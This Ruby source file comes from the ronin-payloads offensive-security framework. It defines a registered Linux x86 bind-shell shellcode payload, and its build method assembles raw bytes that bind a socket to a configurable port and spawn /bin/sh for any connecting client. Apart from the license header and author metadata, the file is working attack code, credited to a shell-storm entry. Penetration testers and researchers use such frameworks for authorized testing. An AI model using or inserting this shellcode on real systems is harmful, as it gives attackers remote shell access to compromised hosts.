# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/bind_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module X86
          #
          # Linux x86 shellcode that binds a shell to a port.
          #
          class BindShell < BindShellPayload

            register 'shellcode/linux/x86/bind_shell'

            arch :x86
            os :linux

            author 'sToRm', email:   'hixmostorm@hotmail.com',
                            website: 'http://www.gonullyourself.org'

            summary 'Linux x86 bind shell shellcode'
            description <<~DESC
              Linux x86 shellcode that binds a shell to a port.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-78.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x6a\x66" \
                         "\x58" \
                         "\x31\xdb" \
                         "\x53" \
                         "\x43" \
                         "\x53" \
                         "\x6a\x02" \
                         "\x89\xe1" \
                         "\xcd\x80" \
                         "\x31\xd2" \
                         "\x52" \
                         "\x68\xff\x02#{packed_port}" \
                         "\x89\xe1" \
                         "\x6a\x10" \
                         "\x51" \
                         "\x50" \
                         "\x89\xe1" \
                         "\x89\xc6" \
                         "\x43" \
                         "\xb0\x66" \
                         "\xcd\x80" \
                         "\xb0\x66" \
                         "\x43" \
                         "\x43" \
                         "\xcd\x80" \
                         "\x50" \
                         "\x56" \
                         "\x89\xe1" \
                         "\x43" \
                         "\xb0\x66" \
                         "\xcd\x80" \
                         "\x93" \
                         "\x6a\x03" \
                         "\x59" \
                         \
                         "\x49" \
                         "\x6a\x3f" \
                         "\x58" \
                         "\xcd\x80" \
                         "\x75\xf8" \
                         "\xf7\xe1" \
                         "\x51" \
                         "\x68\x2f\x2f\x73\x68" \
                         "\x68\x2f\x62\x69\x6e" \
                         "\x89\xe3" \
                         "\xb0\x0b" \
                         "\xcd\x80"
            end

          end
        end
      end
    end
  end
end
